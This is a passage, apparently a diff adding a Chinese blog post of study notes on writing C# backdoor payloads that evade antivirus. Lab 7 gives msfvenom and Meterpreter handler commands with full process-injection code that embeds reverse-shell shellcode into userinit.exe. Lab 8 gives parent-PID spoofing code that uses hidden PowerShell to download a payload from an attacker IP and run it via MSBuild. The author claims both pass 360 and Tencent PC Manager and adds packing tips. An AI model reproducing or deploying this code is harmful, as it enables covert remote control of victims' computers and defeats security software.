+}</code></pre><h2 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h2><blockquote>
+<p>测试结果：过360及电脑管家。<br>lab7主要用于启动一个进程，然后向该进程注入shellcode。<br>在Process Explorer中可以看到我们的的恶意代码是由一个正常的进程运行的。</p>
+</blockquote>
+<p> PS：不会产生新的进程，也没有落地的文件,意味着安全人员的检测将会更加困难。</p>
+<p> 0x01</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f csharp
+handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_tcp</code></pre><p> 0x02</p>
+<pre><code>using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System;
+using System.Text;
+public class Program
+{
+[StructLayout(LayoutKind.Sequential)]
+public class SecurityAttributes
+{
+    public Int32 Length = 0;
+    public IntPtr lpSecurityDescriptor = IntPtr.Zero;
+    public bool bInheritHandle = false;
+
+    public SecurityAttributes()
+    {
+        this.Length = Marshal.SizeOf(this);
+    }
+}
+[StructLayout(LayoutKind.Sequential)]
+public struct ProcessInformation
+{
+    public IntPtr hProcess;
+    public IntPtr hThread;
+    public Int32 dwProcessId;
+    public Int32 dwThreadId;
+}
+[Flags]
+public enum CreateProcessFlags : uint
+{
+    DEBUG_PROCESS = 0x00000001,
+    DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+    CREATE_SUSPENDED = 0x00000004,
+    DETACHED_PROCESS = 0x00000008,
+    CREATE_NEW_CONSOLE = 0x00000010,
+    NORMAL_PRIORITY_CLASS = 0x00000020,
+    IDLE_PRIORITY_CLASS = 0x00000040,
+    HIGH_PRIORITY_CLASS = 0x00000080,
+    REALTIME_PRIORITY_CLASS = 0x00000100,
+    CREATE_NEW_PROCESS_GROUP = 0x00000200,
+    CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+    CREATE_SEPARATE_WOW_VDM = 0x00000800,
+    CREATE_SHARED_WOW_VDM = 0x00001000,
+    CREATE_FORCEDOS = 0x00002000,
+    BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+    ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+    INHERIT_PARENT_AFFINITY = 0x00010000,
+    INHERIT_CALLER_PRIORITY = 0x00020000,
+    CREATE_PROTECTED_PROCESS = 0x00040000,
+    EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+    PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+    PROCESS_MODE_BACKGROUND_END = 0x00200000,
+    CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+    CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+    CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+    CREATE_NO_WINDOW = 0x08000000,
+    PROFILE_USER = 0x10000000,
+    PROFILE_KERNEL = 0x20000000,
+    PROFILE_SERVER = 0x40000000,
+    CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
+}
+
+
+[StructLayout(LayoutKind.Sequential)]
+public class StartupInfo
+{
+    public Int32 cb = 0;
+    public IntPtr lpReserved = IntPtr.Zero;
+    public IntPtr lpDesktop = IntPtr.Zero;
+    public IntPtr lpTitle = IntPtr.Zero;
+    public Int32 dwX = 0;
+    public Int32 dwY = 0;
+    public Int32 dwXSize = 0;
+    public Int32 dwYSize = 0;
+    public Int32 dwXCountChars = 0;
+    public Int32 dwYCountChars = 0;
+    public Int32 dwFillAttribute = 0;
+    public Int32 dwFlags = 0;
+    public Int16 wShowWindow = 0;
+    public Int16 cbReserved2 = 0;
+    public IntPtr lpReserved2 = IntPtr.Zero;
+    public IntPtr hStdInput = IntPtr.Zero;
+    public IntPtr hStdOutput = IntPtr.Zero;
+    public IntPtr hStdError = IntPtr.Zero;
+    public StartupInfo()
+    {
+        this.cb = Marshal.SizeOf(this);
+    }
+}
+[DllImport(&quot;kernel32.dll&quot;)]
+public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
+        IntPtr lpEnvironment,
+        String lpCurrentDirectory,
+        [In] StartupInfo lpStartupInfo,
+        out ProcessInformation lpProcessInformation
+
+    );
+
+[DllImport(&quot;kernel32.dll&quot;)]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
+
+[DllImport(&quot;kernel32.dll&quot;)]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
+
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);
+
+
+private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+private static UInt32 MEM_COMMIT = 0x1000;
+
+public static void Main()
+{
+    string binary = &quot;userinit.exe&quot;;
+
+    byte[] sc = new byte[679] {
+0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
+0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
+0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
+0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
+0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
+0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
+0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,
+0x5a,0x59,0x6e,0x42,0x4a,0x64,0x36,0x62,0x67,0x52,0x63,0x69,0x33,0x67,0x55,
+0x36,0x30,0x47,0x53,0x76,0x57,0x6e,0x72,0x79,0x63,0x2d,0x46,0x7a,0x31,0x53,
+0x2d,0x4a,0x31,0x6c,0x76,0x55,0x77,0x2d,0x46,0x47,0x4a,0x62,0x47,0x75,0x57,
+0x30,0x46,0x61,0x50,0x4c,0x49,0x4b,0x63,0x4a,0x35,0x52,0x7a,0x43,0x37,0x43,
+0x5a,0x31,0x77,0x62,0x58,0x6f,0x41,0x2d,0x47,0x73,0x35,0x65,0x56,0x32,0x79,
+0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
+0x32,0xa0,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
+0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,
+0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49, 
+0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
+0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,
+0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,
+0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
+0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
+0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,
+0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,
+0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,
+0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
+0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
+0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,
+0xa2,0x56,0xff,0xd5 };
+
+    Int32 size = sc.Length;
+    StartupInfo sInfo = new StartupInfo();
+    sInfo.dwFlags = 0;
+    ProcessInformation pInfo;
+    string binaryPath = &quot;C:\\Windows\\System32\\&quot;+binary;    
+    IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
+    IntPtr hProcess = pInfo.hProcess;
+    IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    int test = 0;
+    IntPtr size2 = new IntPtr(sc.Length);
+    bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
+    CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
+ }
+}</code></pre><p>0x03</p>
+<p> 一个正常进程，返回了session。<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/04.png)<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/05.png)</p>
+<h2 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h2><blockquote>
+<p>测试结果：全过。</p>
+</blockquote>
+<ul>
+<li>lab8可以向一个已存在进程插入一个新的进程，并向这个新的进程其注入shellcode以获得反向shell。</li>
+<li>这里选择插入cmd命令，MSBuil白加黑获取shell</li>
+</ul>
+<p>PS：主要由于笔者太菜，没能成功插入shellcode</p>
+<p>0x01</p>
+<pre><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Runtime.InteropServices;
+using Microsoft.Win32.SafeHandles;
+using System.IO;
+using System.Diagnostics;
+
+namespace ExecutionTesting
+{
+class Program
+{
+    static void Main(string[] args)
+    {
+    Console.WriteLine(&quot;Listing all processes...&quot;);
+    Console.WriteLine(&quot;-------------------------------------------`-------------------------&quot;);
+
+    Process[] procs = Process.GetProcesses();
+    foreach (Process proc in procs)
+    {
+        try
+        {
+            Console.WriteLine(&quot;Name:&quot; + proc.ProcessName + &quot; Path:&quot; + proc.MainModule.FileName + &quot; Id:&quot; + proc.Id);
+        }
+        catch
+        {
+            continue;
+        }
+    }
+        if (args.Length != 1)
+        {
+            Console.WriteLine(&quot;Usage: ExecutionTesting.exe &lt;pid&gt;&quot;);
+            return;
+        }
+
+        int newParentProcId;
+        if (!Int32.TryParse(args[0], out newParentProcId))
+        {
+            Console.WriteLine(&quot;Usage: ExecutionTesting.exe &lt;pid&gt;&quot;);
+            return;
+        }
+
+        // Modify the below to execute something else, ping -n 15 used so we can watch in procexp ;)
+        string command = &quot;cmd.exe /c powershell -w hidden Invoke-WebRequest -uri http://172.22.35.212/8080.xml -OutFile 8080.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 8080.xml&quot;;
+
+        Console.WriteLine(String.Format(&quot;Press enter to execute &apos;{0}&apos; under pid {1}&quot;, command, newParentProcId));
+        Console.ReadKey();
+        UnmanagedExecute.CreateProcess(newParentProcId, command);
+        Console.WriteLine(&quot;Done. Press any key to exit...&quot;);
+        Console.ReadKey();
+    }
+}
+
+class UnmanagedExecute
+{
+    [DllImport(&quot;kernel32.dll&quot;)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool CreateProcess(
+        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
+        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
+        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UpdateProcThreadAttribute(
+        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
+        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool InitializeProcThreadAttributeList(
+        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask,
+       HANDLE_FLAGS dwFlags);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    static extern bool PeekNamedPipe(IntPtr handle,
+        IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead,
+        ref uint bytesAvail, IntPtr BytesLeftThisMessage);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
+       IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle,
+       uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
+
+    [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern int GetConsoleOutputCP();
+
+    [DllImport(&quot;kernel32.dll&quot;)]
+    static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
+       ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+
+    public static bool CreateProcess(int parentProcessId, string command)
+    {
+        // STARTUPINFOEX members
+        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+
+        // STARTUPINFO members (dwFlags and wShowWindow)
+        const int STARTF_USESTDHANDLES = 0x00000100;
+        const int STARTF_USESHOWWINDOW = 0x00000001;
+        const short SW_HIDE = 0x0000;
+
+        // dwCreationFlags
+        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+        const uint CREATE_NO_WINDOW = 0x08000000;
+
+        // WaitForSingleObject INFINITE
+        const UInt32 INFINITE = 0xFFFFFFFF;
+        var error = Marshal.GetLastWin32Error();
+
+        // DuplicateHandle
+        const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
+        const uint DUPLICATE_SAME_ACCESS = 0x00000002;
+
+        // https://msdn.microsoft.com/en-us/library/ms682499(VS.85).aspx
+        // Handle stuff
+        var saHandles = new SECURITY_ATTRIBUTES();
+        saHandles.nLength = Marshal.SizeOf(saHandles);
+        saHandles.bInheritHandle = true;
+        saHandles.lpSecurityDescriptor = IntPtr.Zero;
+
+        IntPtr hStdOutRead;
+        IntPtr hStdOutWrite;
+        // Duplicate handle created just in case
+        IntPtr hDupStdOutWrite = IntPtr.Zero;
+
+        // Create the pipe and make sure read is not inheritable
+        CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
+        SetHandleInformation(hStdOutRead, HANDLE_FLAGS.INHERIT, 0);
+
+        var pInfo = new PROCESS_INFORMATION();
+        var siEx = new STARTUPINFOEX();
+
+        // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
+        siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
+        IntPtr lpValueProc = IntPtr.Zero;
+        IntPtr hSourceProcessHandle = IntPtr.Zero;
+
+        // Values will be overwritten if parentProcessId &gt; 0
+        siEx.StartupInfo.hStdError = hStdOutWrite;
+        siEx.StartupInfo.hStdOutput = hStdOutWrite;
+
+        try
+        {
+            if (parentProcessId &gt; 0)
+            {
+                var lpSize = IntPtr.Zero;
+                var success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+                if (success || lpSize == IntPtr.Zero)
+                {
+                    return false;
+                }
+
+                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                success = InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
+                if (!success)
+                {
+                    return false;
+                }
+
+                IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
+                // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
+                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValueProc, parentHandle);
+
+                success = UpdateProcThreadAttribute(
+                    siEx.lpAttributeList,
+                    0,
+                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                    lpValueProc,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+                if (!success)
+                {
+                    return false;
+                }
+
+                IntPtr hCurrent = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                IntPtr hNewParent = OpenProcess(ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
+
+                success = DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
+                if (!success)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    return false;
+                }
+
+                error = Marshal.GetLastWin32Error();
+                siEx.StartupInfo.hStdError = hDupStdOutWrite;
+                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
+            }
+
+            siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+            siEx.StartupInfo.wShowWindow = SW_HIDE;
+
+            var ps = new SECURITY_ATTRIBUTES();
+            var ts = new SECURITY_ATTRIBUTES();
+            ps.nLength = Marshal.SizeOf(ps);
+            ts.nLength = Marshal.SizeOf(ts);
+            bool ret = CreateProcess(null, command, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
+            if(!ret)
+            {
+                Console.WriteLine(&quot;[!] Proccess failed to execute!&quot;);
+                return false;
+            }
+            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
+            var encoding = Encoding.GetEncoding(GetConsoleOutputCP());
+            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
+            string result = &quot;&quot;;
+            bool exit = false;
+            try
+            {
+                do
+                {
+                    if(WaitForSingleObject(pInfo.hProcess, 100) == 0)
+                    {
+                        exit = true;
+                    }
+
+                    char[] buf = null;
+                    int bytesRead;
+
+                    uint bytesToRead = 0;
+
+                    bool peekRet = PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);
+
+                    if (peekRet == true &amp;&amp; bytesToRead == 0)
+                    {
+                        if (exit == true)
+                        {
+                            Console.WriteLine(&quot;Command executed.&quot;);
+                            break;
+                        }
+                        else
+                        {
+                            continue;
+                        }
+                    }
+
+                    if (bytesToRead &gt; 4096)
+                        bytesToRead = 4096;
+
+                    buf = new char[bytesToRead];
+                    bytesRead = reader.Read(buf, 0, buf.Length);
+                    if (bytesRead &gt; 0)
+                    {
+                        Console.WriteLine(String.Format(&quot;[+] {0} bytes read&quot;, bytesRead));
+                        result += new string(buf);
+                    }
+
+                }while(true);
+                reader.Close();
+            }
+            finally
+            {
+                if (!safeHandle.IsClosed)
+                {
+                    safeHandle.Close();
+                }
+            }
+
+            if (hStdOutRead != IntPtr.Zero)
+            {
+                CloseHandle(hStdOutRead);
+            }
+            Console.WriteLine(result);
+            return true;
+
+
+        }
+        finally
+        {
+            // Free the attribute list
+            if (siEx.lpAttributeList != IntPtr.Zero)
+            {
+                DeleteProcThreadAttributeList(siEx.lpAttributeList);
+                Marshal.FreeHGlobal(siEx.lpAttributeList);
+            }
+            Marshal.FreeHGlobal(lpValueProc);
+
+            // Close process and thread handles
+            if (pInfo.hProcess != IntPtr.Zero)
+            {
+                CloseHandle(pInfo.hProcess);
+            }
+            if (pInfo.hThread != IntPtr.Zero)
+            {
+                CloseHandle(pInfo.hThread);
+            }
+        }
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFOEX
+    {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFO
+    {
+        public Int32 cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECURITY_ATTRIBUTES
+    {
+        public int nLength;
+        public IntPtr lpSecurityDescriptor;
+        [MarshalAs(UnmanagedType.Bool)]
+        public bool bInheritHandle;
+    }
+
+    [Flags]
+    public enum ProcessAccessFlags : uint
+    {
+        All = 0x001F0FFF,
+        Terminate = 0x00000001,
+        CreateThread = 0x00000002,
+        VirtualMemoryOperation = 0x00000008,
+        VirtualMemoryRead = 0x00000010,
+        VirtualMemoryWrite = 0x00000020,
+        DuplicateHandle = 0x00000040,
+        CreateProcess = 0x000000080,
+        SetQuota = 0x00000100,
+        SetInformation = 0x00000200,
+        QueryInformation = 0x00000400,
+        QueryLimitedInformation = 0x00001000,
+        Synchronize = 0x00100000
+    }
+
+    [Flags]
+    enum HANDLE_FLAGS : uint
+    {
+        None = 0,
+        INHERIT = 1,
+        PROTECT_FROM_CLOSE = 2
+    }
+
+    [Flags]
+    public enum DuplicateOptions : uint
+    {
+        DUPLICATE_CLOSE_SOURCE = 0x00000001,
+        DUPLICATE_SAME_ACCESS = 0x00000002
+    }
+}
+}</code></pre><p>0x02 </p>
+<pre><code>handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/06.png)<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/07.png)</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li><p>这个项目的免杀效果不错，在深层次的自定义后会更难被检测。</p>
+</li>
+<li><p>每一个lab的思路都很值得学习，如果换一种语言写一遍，可能有奇效。</p>
+</li>
+<li><p>各种隐藏进程的方式，在实战中可能比想象中更强大。</p>
+</li>
+<li><p>感觉还是自己写加载器比较容易免杀，比如lab2那个加载器，根本不会遇到阻拦。</p>
+</li>
+<li><p>后期加壳对免杀有很大帮助，尤其是商业化的加壳工具。</p>
+<p>![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/08.png)</p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/免杀/" rel="tag"># 免杀</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/10/1566846777/" rel="next" title="命令行文件下载的各种姿势">
+                <i class="fa fa-chevron-left"></i> 命令行文件下载的各种姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Bloglogo.jpg" alt="scareing">
+            
+              <p class="site-author-name" itemprop="name">scareing</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jickhab@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#《使用C＃编写自定义后门负载》学习笔记及免杀尝试"><span class="nav-number">1.</span> <span class="nav-text">《使用C＃编写自定义后门负载》学习笔记及免杀尝试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#测试环境"><span class="nav-number">2.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#测试结果"><span class="nav-number">3.</span> <span class="nav-text">测试结果</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#lab2"><span class="nav-number">3.1.</span> <span class="nav-text">lab2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lab3-lab4"><span class="nav-number">4.</span> <span class="nav-text">lab3+lab4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#lab5"><span class="nav-number">4.1.</span> <span class="nav-text">lab5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab6"><span class="nav-number">4.2.</span> <span class="nav-text">lab6</span></a></li><li class="nav-item 